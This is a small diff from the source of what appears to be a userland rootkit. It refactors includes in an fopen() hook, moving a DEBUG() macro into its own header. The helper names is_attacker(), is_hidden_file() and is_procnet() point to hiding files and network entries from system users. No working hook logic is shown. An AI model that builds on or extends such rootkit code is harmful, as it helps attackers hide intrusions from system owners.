@@ -19,8 +19,9 @@
  */
 
 #include <errno.h> /* errno, ENOENT */
-#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file(), is_procnet() */
+#include "beurk.h" /* is_attacker(), is_hidden_file(), is_procnet() */
 #include "config.h" /* REAL_FOPEN() */
+#include "debug.h" /* DEBUG() */
 #include "hooks.h" /* prototype, FILE */
 
 FILE *fopen(const char *__restrict path, const char *mode) {
